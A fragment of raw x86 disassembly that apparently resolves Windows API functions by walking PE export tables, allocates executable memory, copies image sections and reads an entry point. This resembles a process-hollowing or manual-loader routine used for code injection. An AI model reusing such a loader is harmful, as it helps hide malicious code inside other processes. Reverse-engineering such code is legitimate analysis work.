  4034ed:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4034f0:	89 d7                	mov    %edx,%edi
  4034f2:	01 d1                	add    %edx,%ecx
  4034f4:	83 ec 08             	sub    $0x8,%esp
  4034f7:	89 c6                	mov    %eax,%esi
  4034f9:	50                   	push   %eax
  4034fa:	51                   	push   %ecx
  4034fb:	e8 44 e6 00 00       	call   0x411b44
  403500:	83 c4 10             	add    $0x10,%esp
  403503:	85 c0                	test   %eax,%eax
  403505:	78 d1                	js     0x4034d8
  403507:	89 fa                	mov    %edi,%edx
  403509:	89 f0                	mov    %esi,%eax
  40350b:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40350e:	75 b8                	jne    0x4034c8
  403510:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403513:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403517:	01 d0                	add    %edx,%eax
  403519:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  40351d:	01 d1                	add    %edx,%ecx
  40351f:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403523:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403526:	03 10                	add    (%eax),%edx
  403528:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40352b:	c7 45 90 02 00 00 00 	movl   $0x2,-0x70(%ebp)
  403532:	83 ec 08             	sub    $0x8,%esp
  403535:	8d 8d 5c fc ff ff    	lea    -0x3a4(%ebp),%ecx
  40353b:	51                   	push   %ecx
  40353c:	50                   	push   %eax
  40353d:	ff d2                	call   *%edx
  40353f:	83 c4 08             	add    $0x8,%esp
  403542:	85 c0                	test   %eax,%eax
  403544:	0f 88 68 04 00 00    	js     0x4039b2
  40354a:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%ebp)
  403551:	00 00 00 
  403554:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403557:	89 45 84             	mov    %eax,-0x7c(%ebp)
  40355a:	8b 85 00 fd ff ff    	mov    -0x300(%ebp),%eax
  403560:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403563:	a1 20 5e 71 00       	mov    0x715e20,%eax
  403568:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40356b:	c7 45 90 03 00 00 00 	movl   $0x3,-0x70(%ebp)
  403572:	e8 01 f5 ff ff       	call   0x402a78
  403577:	8b 75 e8             	mov    -0x18(%ebp),%esi
  40357a:	83 c6 08             	add    $0x8,%esi
  40357d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403580:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403583:	8b 4c 0a 78          	mov    0x78(%edx,%ecx,1),%ecx
  403587:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40358c:	89 f7                	mov    %esi,%edi
  40358e:	77 1a                	ja     0x4035aa
  403590:	8b 74 0a 1c          	mov    0x1c(%edx,%ecx,1),%esi
  403594:	01 d6                	add    %edx,%esi
  403596:	89 cb                	mov    %ecx,%ebx
  403598:	0f b7 c8             	movzwl %ax,%ecx
  40359b:	2b 4c 1a 10          	sub    0x10(%edx,%ebx,1),%ecx
  40359f:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
  4035a2:	8b 75 84             	mov    -0x7c(%ebp),%esi
  4035a5:	e9 7d 00 00 00       	jmp    0x403627
  4035aa:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4035ad:	8b 5c 0a 18          	mov    0x18(%edx,%ecx,1),%ebx
  4035b1:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  4035b7:	8b 4c 0a 20          	mov    0x20(%edx,%ecx,1),%ecx
  4035bb:	01 d1                	add    %edx,%ecx
  4035bd:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4035c0:	31 f6                	xor    %esi,%esi
  4035c2:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  4035c8:	4b                   	dec    %ebx
  4035c9:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4035cc:	eb 0f                	jmp    0x4035dd
  4035ce:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4035d5:	00 00 00 
  4035d8:	43                   	inc    %ebx
  4035d9:	89 de                	mov    %ebx,%esi
  4035db:	89 f8                	mov    %edi,%eax
  4035dd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4035e0:	8d 1c 31             	lea    (%ecx,%esi,1),%ebx
  4035e3:	d1 eb                	shr    $1,%ebx
  4035e5:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4035e8:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4035eb:	03 4d ec             	add    -0x14(%ebp),%ecx
  4035ee:	83 ec 08             	sub    $0x8,%esp
  4035f1:	89 c7                	mov    %eax,%edi
  4035f3:	50                   	push   %eax
  4035f4:	51                   	push   %ecx
  4035f5:	e8 4a e5 00 00       	call   0x411b44
  4035fa:	83 c4 10             	add    $0x10,%esp
  4035fd:	85 c0                	test   %eax,%eax
  4035ff:	78 d7                	js     0x4035d8
  403601:	89 f8                	mov    %edi,%eax
  403603:	75 c3                	jne    0x4035c8
  403605:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403608:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
  40360e:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403612:	01 d0                	add    %edx,%eax
  403614:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403618:	01 d1                	add    %edx,%ecx
  40361a:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  40361e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403621:	8b 75 84             	mov    -0x7c(%ebp),%esi
  403624:	8b 7d e8             	mov    -0x18(%ebp),%edi
  403627:	03 10                	add    (%eax),%edx
  403629:	c7 45 90 04 00 00 00 	movl   $0x4,-0x70(%ebp)
  403630:	83 ec 0c             	sub    $0xc,%esp
  403633:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403636:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40363c:	51                   	push   %ecx
  40363d:	6a 04                	push   $0x4
  40363f:	50                   	push   %eax
  403640:	57                   	push   %edi
  403641:	56                   	push   %esi
  403642:	ff d2                	call   *%edx
  403644:	83 c4 0c             	add    $0xc,%esp
  403647:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40364a:	03 4d 08             	add    0x8(%ebp),%ecx
  40364d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403650:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403653:	8b 49 50             	mov    0x50(%ecx),%ecx
  403656:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  40365d:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  403663:	c7 45 90 05 00 00 00 	movl   $0x5,-0x70(%ebp)
  40366a:	83 ec 08             	sub    $0x8,%esp
  40366d:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  403673:	6a 40                	push   $0x40
  403675:	68 00 30 00 00       	push   $0x3000
  40367a:	51                   	push   %ecx
  40367b:	6a 00                	push   $0x0
  40367d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403680:	51                   	push   %ecx
  403681:	50                   	push   %eax
  403682:	e8 09 0b 00 00       	call   0x404190
  403687:	83 c4 20             	add    $0x20,%esp
  40368a:	85 c0                	test   %eax,%eax
  40368c:	0f 88 19 03 00 00    	js     0x4039ab
  403692:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403695:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403698:	85 c0                	test   %eax,%eax
  40369a:	0f 84 12 03 00 00    	je     0x4039b2
  4036a0:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4036a3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4036a6:	8b 52 54             	mov    0x54(%edx),%edx
  4036a9:	c7 45 90 07 00 00 00 	movl   $0x7,-0x70(%ebp)
  4036b0:	83 ec 0c             	sub    $0xc,%esp
  4036b3:	6a 00                	push   $0x0
  4036b5:	52                   	push   %edx
  4036b6:	ff 75 08             	push   0x8(%ebp)
  4036b9:	50                   	push   %eax
  4036ba:	51                   	push   %ecx
  4036bb:	e8 ac 03 00 00       	call   0x403a6c
  4036c0:	83 c4 20             	add    $0x20,%esp
  4036c3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4036c6:	66 83 7a 06 00       	cmpw   $0x0,0x6(%edx)
  4036cb:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4036ce:	74 5c                	je     0x40372c
  4036d0:	0f b7 4a 14          	movzwl 0x14(%edx),%ecx
  4036d4:	8d 74 0a 2c          	lea    0x2c(%edx,%ecx,1),%esi
  4036d8:	31 d2                	xor    %edx,%edx
  4036da:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  4036e1:	1f 84 00 00 00 00 00 
  4036e8:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4036eb:	8b 4e f8             	mov    -0x8(%esi),%ecx
  4036ee:	8b 56 fc             	mov    -0x4(%esi),%edx
  4036f1:	03 4d d8             	add    -0x28(%ebp),%ecx
  4036f4:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4036f7:	8b 36                	mov    (%esi),%esi
  4036f9:	03 75 08             	add    0x8(%ebp),%esi
  4036fc:	c7 45 90 09 00 00 00 	movl   $0x9,-0x70(%ebp)
  403703:	83 ec 0c             	sub    $0xc,%esp
  403706:	6a 00                	push   $0x0
  403708:	52                   	push   %edx
  403709:	56                   	push   %esi
  40370a:	51                   	push   %ecx
  40370b:	50                   	push   %eax
  40370c:	e8 5b 03 00 00       	call   0x403a6c
  403711:	83 c4 20             	add    $0x20,%esp
  403714:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403717:	42                   	inc    %edx
  403718:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40371b:	0f b7 48 06          	movzwl 0x6(%eax),%ecx
  40371f:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403722:	8b 75 f0             	mov    -0x10(%ebp),%esi
  403725:	83 c6 28             	add    $0x28,%esi
  403728:	39 ca                	cmp    %ecx,%edx
  40372a:	72 bc                	jb     0x4036e8
  40372c:	8b 8d 00 fd ff ff    	mov    -0x300(%ebp),%ecx
  403732:	83 c1 08             	add    $0x8,%ecx
  403735:	c7 45 90 08 00 00 00 	movl   $0x8,-0x70(%ebp)
  40373c:	83 ec 0c             	sub    $0xc,%esp
  40373f:	8d 55 d8             	lea    -0x28(%ebp),%edx
  403742:	6a 00                	push   $0x0
  403744:	6a 04                	push   $0x4
  403746:	52                   	push   %edx
  403747:	51                   	push   %ecx
  403748:	50                   	push   %eax
  403749:	e8 1e 03 00 00       	call   0x403a6c
  40374e:	83 c4 20             	add    $0x20,%esp
  403751:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403754:	8b 40 28             	mov    0x28(%eax),%eax
  403757:	03 45 d8             	add    -0x28(%ebp),%eax
  40375a:	89 85 0c fd ff ff    	mov    %eax,-0x2f4(%ebp)
  403760:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403763:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403766:	a1 20 5e 71 00       	mov    0x715e20,%eax
  40376b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40376e:	c7 45 90 0a 00 00 00 	movl   $0xa,-0x70(%ebp)
  403775:	e8 6e ef ff ff       	call   0x4026e8
  40377a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40377d:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403780:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403784:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403789:	77 12                	ja     0x40379d
  40378b:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  40378f:	01 d7                	add    %edx,%edi
  403791:	0f b7 c8             	movzwl %ax,%ecx
  403794:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403798:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  40379b:	eb 79                	jmp    0x403816
  40379d:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  4037a1:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4037a4:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  4037a8:	01 d1                	add    %edx,%ecx
  4037aa:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4037ad:	31 c9                	xor    %ecx,%ecx
  4037af:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4037b6:	00 00 
  4037b8:	4b                   	dec    %ebx
  4037b9:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4037bc:	eb 11                	jmp    0x4037cf
  4037be:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4037c5:	00 00 00 
  4037c8:	43                   	inc    %ebx
  4037c9:	89 d9                	mov    %ebx,%ecx
  4037cb:	89 fa                	mov    %edi,%edx
  4037cd:	89 f0                	mov    %esi,%eax
  4037cf:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4037d2:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4037d5:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  4037d8:	d1 eb                	shr    $1,%ebx
  4037da:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4037dd:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4037e0:	89 d7                	mov    %edx,%edi
  4037e2:	01 d1                	add    %edx,%ecx
  4037e4:	83 ec 08             	sub    $0x8,%esp
  4037e7:	89 c6                	mov    %eax,%esi
  4037e9:	50                   	push   %eax
  4037ea:	51                   	push   %ecx
  4037eb:	e8 54 e3 00 00       	call   0x411b44
  4037f0:	83 c4 10             	add    $0x10,%esp
  4037f3:	85 c0                	test   %eax,%eax
  4037f5:	78 d1                	js     0x4037c8
  4037f7:	89 fa                	mov    %edi,%edx
  4037f9:	89 f0                	mov    %esi,%eax
  4037fb:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4037fe:	75 b8                	jne    0x4037b8
  403800:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403803:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403807:	01 d0                	add    %edx,%eax
  403809:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  40380d:	01 d1                	add    %edx,%ecx
  40380f:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403813:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403816:	03 10                	add    (%eax),%edx
  403818:	c7 45 90 0b 00 00 00 	movl   $0xb,-0x70(%ebp)
  40381f:	83 ec 08             	sub    $0x8,%esp
  403822:	8d 85 5c fc ff ff    	lea    -0x3a4(%ebp),%eax
  403828:	50                   	push   %eax
  403829:	ff 75 e4             	push   -0x1c(%ebp)
  40382c:	ff d2                	call   *%edx
  40382e:	83 c4 08             	add    $0x8,%esp
  403831:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403834:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403837:	a1 20 5e 71 00       	mov    0x715e20,%eax
  40383c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40383f:	c7 45 90 0c 00 00 00 	movl   $0xc,-0x70(%ebp)
  403846:	e8 fd f0 ff ff       	call   0x402948
  40384b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40384e:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403851:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403855:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40385a:	77 12                	ja     0x40386e
  40385c:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403860:	01 d7                	add    %edx,%edi
  403862:	0f b7 c8             	movzwl %ax,%ecx
  403865:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403869:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  40386c:	eb 78                	jmp    0x4038e6
  40386e:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  403872:	89 75 e8             	mov    %esi,-0x18(%ebp)
  403875:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  403879:	01 d1                	add    %edx,%ecx
  40387b:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40387e:	31 c9                	xor    %ecx,%ecx
  403880:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  403887:	00 
  403888:	4b                   	dec    %ebx
  403889:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40388c:	eb 11                	jmp    0x40389f
  40388e:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403895:	00 00 00 
  403898:	43                   	inc    %ebx
  403899:	89 d9                	mov    %ebx,%ecx
  40389b:	89 fa                	mov    %edi,%edx
  40389d:	89 f0                	mov    %esi,%eax
  40389f:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4038a2:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4038a5:	8d 1c 0e             	lea    (%esi,%ecx,1),%ebx
  4038a8:	d1 eb                	shr    $1,%ebx
  4038aa:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4038ad:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  4038b0:	89 d7                	mov    %edx,%edi
  4038b2:	01 d1                	add    %edx,%ecx
  4038b4:	83 ec 08             	sub    $0x8,%esp
  4038b7:	89 c6                	mov    %eax,%esi
  4038b9:	50                   	push   %eax
  4038ba:	51                   	push   %ecx
  4038bb:	e8 84 e2 00 00       	call   0x411b44
  4038c0:	83 c4 10             	add    $0x10,%esp
  4038c3:	85 c0                	test   %eax,%eax
  4038c5:	78 d1                	js     0x403898
  4038c7:	89 fa                	mov    %edi,%edx
  4038c9:	89 f0                	mov    %esi,%eax
  4038cb:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4038ce:	75 b8                	jne    0x403888
  4038d0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4038d3:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  4038d7:	01 d0                	add    %edx,%eax
  4038d9:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  4038dd:	01 d1                	add    %edx,%ecx
  4038df:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  4038e3:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4038e6:	03 10                	add    (%eax),%edx
  4038e8:	c7 45 90 0d 00 00 00 	movl   $0xd,-0x70(%ebp)
  4038ef:	83 ec 08             	sub    $0x8,%esp
  4038f2:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4038f5:	50                   	push   %eax
  4038f6:	ff 75 e4             	push   -0x1c(%ebp)
  4038f9:	ff d2                	call   *%edx
  4038fb:	83 c4 08             	add    $0x8,%esp
  4038fe:	31 c0                	xor    %eax,%eax
  403900:	e9 b2 00 00 00       	jmp    0x4039b7
  403905:	8b 45 8c             	mov    -0x74(%ebp),%eax
  403908:	3d 11 00 00 00       	cmp    $0x11,%eax
  40390d:	0f 87 96 00 00 00    	ja     0x4039a9
  403913:	2d 01 00 00 00       	sub    $0x1,%eax
  403918:	ff 24 85 28 3a 40 00 	jmp    *0x403a28(,%eax,4)
  40391f:	eb 25                	jmp    0x403946
  403921:	eb 23                	jmp    0x403946
  403923:	8b 45 98             	mov    -0x68(%ebp),%eax
  403926:	83 ec 0c             	sub    $0xc,%esp
  403929:	ff 75 94             	push   -0x6c(%ebp)
  40392c:	e8 8b bc 01 00       	call   0x41f5bc
  403931:	83 c4 10             	add    $0x10,%esp
  403934:	c7 45 90 06 00 00 00 	movl   $0x6,-0x70(%ebp)
  40393b:	e8 e8 bc 01 00       	call   0x41f628
  403940:	eb 69                	jmp    0x4039ab
  403942:	eb 02                	jmp    0x403946
  403944:	eb 00                	jmp    0x403946
  403946:	8b 45 94             	mov    -0x6c(%ebp),%eax
  403949:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  40394c:	89 8d 6c ff ff ff    	mov    %ecx,-0x94(%ebp)
  403952:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  403958:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40395c:	74 16                	je     0x403974
  40395e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403961:	c7 45 90 10 00 00 00 	movl   $0x10,-0x70(%ebp)
  403968:	83 ec 0c             	sub    $0xc,%esp
  40396b:	50                   	push   %eax
  40396c:	e8 d7 d8 01 00       	call   0x421248
  403971:	83 c4 0c             	add    $0xc,%esp
  403974:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  403978:	74 16                	je     0x403990
  40397a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40397d:	c7 45 90 11 00 00 00 	movl   $0x11,-0x70(%ebp)
  403984:	83 ec 0c             	sub    $0xc,%esp
  403987:	50                   	push   %eax
  403988:	e8 bb d8 01 00       	call   0x421248
  40398d:	83 c4 0c             	add    $0xc,%esp
  403990:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  403996:	c7 45 90 ff ff ff ff 	movl   $0xffffffff,-0x70(%ebp)
  40399d:	83 ec 0c             	sub    $0xc,%esp
  4039a0:	50                   	push   %eax
  4039a1:	e8 4e d7 01 00       	call   0x4210f4
  4039a6:	83 c4 0c             	add    $0xc,%esp
  4039a9:	0f 0b                	ud2
  4039ab:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4039b2:	b8 01 00 00 00       	mov    $0x1,%eax
  4039b7:	89 45 80             	mov    %eax,-0x80(%ebp)
  4039ba:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  4039be:	74 16                	je     0x4039d6
  4039c0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4039c3:	c7 45 90 0e 00 00 00 	movl   $0xe,-0x70(%ebp)
  4039ca:	83 ec 0c             	sub    $0xc,%esp
  4039cd:	50                   	push   %eax
  4039ce:	e8 75 d8 01 00       	call   0x421248
  4039d3:	83 c4 0c             	add    $0xc,%esp
  4039d6:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  4039da:	8b 7d 80             	mov    -0x80(%ebp),%edi
  4039dd:	0f 84 aa fa ff ff    	je     0x40348d
  4039e3:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4039e6:	8b 4d 80             	mov    -0x80(%ebp),%ecx
  4039e9:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4039ec:	c7 45 90 0f 00 00 00 	movl   $0xf,-0x70(%ebp)
  4039f3:	83 ec 0c             	sub    $0xc,%esp
  4039f6:	50                   	push   %eax
  4039f7:	e8 4c d8 01 00       	call   0x421248
  4039fc:	8b 7d f0             	mov    -0x10(%ebp),%edi
  4039ff:	83 c4 0c             	add    $0xc,%esp
  403a02:	e9 86 fa ff ff       	jmp    0x40348d
  403a07:	8b 45 98             	mov    -0x68(%ebp),%eax
  403a0a:	eb 0d                	jmp    0x403a19
  403a0c:	8b 45 98             	mov    -0x68(%ebp),%eax
  403a0f:	eb 08                	jmp    0x403a19
  403a11:	8b 45 98             	mov    -0x68(%ebp),%eax
  403a14:	eb 03                	jmp    0x403a19
  403a16:	8b 45 98             	mov    -0x68(%ebp),%eax
  403a19:	83 ec 0c             	sub    $0xc,%esp
  403a1c:	ff 75 94             	push   -0x6c(%ebp)
  403a1f:	e8 d4 0e 00 00       	call   0x4048f8
  403a24:	83 c4 0c             	add    $0xc,%esp
  403a27:	90                   	nop
  403a28:	1f                   	pop    %ds
  403a29:	39 40 00             	cmp    %eax,0x0(%eax)
  403a2c:	1f                   	pop    %ds
  403a2d:	39 40 00             	cmp    %eax,0x0(%eax)
  403a30:	21 39                	and    %edi,(%ecx)
  403a32:	40                   	inc    %eax
  403a33:	00 21                	add    %ah,(%ecx)
  403a35:	39 40 00             	cmp    %eax,0x0(%eax)
  403a38:	23 39                	and    (%ecx),%edi
  403a3a:	40                   	inc    %eax
  403a3b:	00 42 39             	add    %al,0x39(%edx)
  403a3e:	40                   	inc    %eax
  403a3f:	00 42 39             	add    %al,0x39(%edx)
  403a42:	40                   	inc    %eax
  403a43:	00 44 39 40          	add    %al,0x40(%ecx,%edi,1)
  403a47:	00 46 39             	add    %al,0x39(%esi)
  403a4a:	40                   	inc    %eax
  403a4b:	00 44 39 40          	add    %al,0x40(%ecx,%edi,1)
  403a4f:	00 44 39 40          	add    %al,0x40(%ecx,%edi,1)
  403a53:	00 44 39 40          	add    %al,0x40(%ecx,%edi,1)
  403a57:	00 44 39 40          	add    %al,0x40(%ecx,%edi,1)
  403a5b:	00 07                	add    %al,(%edi)
  403a5d:	3a 40 00             	cmp    0x0(%eax),%al
  403a60:	0c 3a                	or     $0x3a,%al
  403a62:	40                   	inc    %eax
  403a63:	00 11                	add    %dl,(%ecx)
  403a65:	3a 40 00             	cmp    0x0(%eax),%al
  403a68:	16                   	push   %ss
  403a69:	3a 40 00             	cmp    0x0(%eax),%al
  403a6c:	55                   	push   %ebp
  403a6d:	53                   	push   %ebx
  403a6e:	57                   	push   %edi
  403a6f:	56                   	push   %esi
  403a70:	83 ec 2c             	sub    $0x2c,%esp
  403a73:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  403a77:	8b 44 24 44          	mov    0x44(%esp),%eax
  403a7b:	8b 74 24 40          	mov    0x40(%esp),%esi
  403a7f:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403a83:	89 44 24 14          	mov    %eax,0x14(%esp)
  403a87:	8b 3d 20 5e 71 00    	mov    0x715e20,%edi
  403a8d:	e8 c6 e8 ff ff       	call   0x402358
  403a92:	89 fa                	mov    %edi,%edx
  403a94:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403a97:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  403a9b:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403aa0:	77 12                	ja     0x403ab4
  403aa2:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  403aa6:	01 d3                	add    %edx,%ebx
  403aa8:	0f b7 c8             	movzwl %ax,%ecx
  403aab:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403aaf:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403ab2:	eb 77                	jmp    0x403b2b
  403ab4:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  403ab8:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403abc:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403ac0:	01 d1                	add    %edx,%ecx
  403ac2:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403ac6:	31 ff                	xor    %edi,%edi
  403ac8:	0f 1f 40 00          	nopl   0x0(%eax)
  403acc:	4d                   	dec    %ebp
  403acd:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403ad1:	eb 10                	jmp    0x403ae3
  403ad3:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403ada:	00 00 
  403adc:	45                   	inc    %ebp
  403add:	89 ef                	mov    %ebp,%edi
  403adf:	89 da                	mov    %ebx,%edx
  403ae1:	89 f0                	mov    %esi,%eax
  403ae3:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ae7:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403aea:	d1 ed                	shr    $1,%ebp
  403aec:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403af0:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403af3:	89 d3                	mov    %edx,%ebx
  403af5:	01 d1                	add    %edx,%ecx
  403af7:	83 ec 08             	sub    $0x8,%esp
  403afa:	89 c6                	mov    %eax,%esi
  403afc:	50                   	push   %eax
  403afd:	51                   	push   %ecx
  403afe:	e8 41 e0 00 00       	call   0x411b44
  403b03:	83 c4 10             	add    $0x10,%esp
  403b06:	85 c0                	test   %eax,%eax
  403b08:	78 d2                	js     0x403adc
  403b0a:	89 da                	mov    %ebx,%edx
  403b0c:	89 f0                	mov    %esi,%eax
  403b0e:	75 bc                	jne    0x403acc
  403b10:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403b14:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403b18:	01 d0                	add    %edx,%eax
  403b1a:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403b1e:	01 d1                	add    %edx,%ecx
  403b20:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403b24:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403b27:	8b 74 24 40          	mov    0x40(%esp),%esi
  403b2b:	89 f7                	mov    %esi,%edi
  403b2d:	03 10                	add    (%eax),%edx
  403b2f:	83 ec 0c             	sub    $0xc,%esp
  403b32:	8d 6c 24 24          	lea    0x24(%esp),%ebp
  403b36:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  403b3a:	8d 74 24 20          	lea    0x20(%esp),%esi
  403b3e:	55                   	push   %ebp
  403b3f:	6a 04                	push   $0x4
  403b41:	53                   	push   %ebx
  403b42:	56                   	push   %esi
  403b43:	57                   	push   %edi
  403b44:	ff d2                	call   *%edx
  403b46:	83 c4 0c             	add    $0xc,%esp
  403b49:	85 c0                	test   %eax,%eax
  403b4b:	0f 88 3c 02 00 00    	js     0x403d8d
  403b51:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403b55:	f6 c1 4c             	test   $0x4c,%cl
  403b58:	75 59                	jne    0x403bb3
  403b5a:	84 c9                	test   %cl,%cl
